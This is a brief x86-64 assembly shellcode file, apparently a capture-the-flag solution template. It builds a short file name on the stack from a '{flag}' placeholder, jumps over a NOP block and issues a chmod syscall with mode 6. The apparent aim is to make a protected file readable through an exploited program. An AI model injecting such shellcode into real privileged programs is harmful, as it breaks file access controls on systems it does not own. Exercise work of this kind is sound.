.intel_syntax noprefix
.global _start

.section .text
_start:
    push 0x{flag}
    push rsp
    pop rdi
    jmp daje

    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop

daje:
    push 6
    pop rsi

    push 0x5a
    pop rax
    syscall